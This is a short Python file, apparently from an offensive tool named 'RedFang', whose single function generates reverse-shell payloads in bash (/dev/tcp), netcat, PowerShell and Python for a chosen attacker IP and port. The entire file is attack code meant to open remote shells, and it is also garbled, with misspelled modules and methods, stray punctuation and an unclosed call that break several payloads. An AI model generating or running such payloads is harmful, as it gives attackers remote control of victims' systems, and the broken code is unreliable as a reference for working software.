#!/usr/bin/env python3

"""
Payload Generator Logic for RedFang
"""

def generate_payload(payload_type, ip, port):
    if payload_type == "bash":
        return f"bash -i >&/dev/tcp/{ip}/{port} 0>&1"
    elif payload_type == "nc":
        return f"nc -e /bin/bash/ {ip} {port}"
    elif payload_type == "pwershell":
        return f"powershell -NoP -NonI -W Hidden Exec Bypass -Command New-Object System.Sockets.TCPCLient('{ip}',{port});"
    elif payload_type == "python":
        return (
            "import sockt,subprocess,os;"
            f"s=socket();s.connect(('{ip}',{port})));"
            "os.dup2(s.fileno(),0): os.dup2(s.fileno(),1); os.dup2(s.filenoo(),2;"
            "subprocess.call(['/bin/sh','-i'])"
        )
    else:
        return None
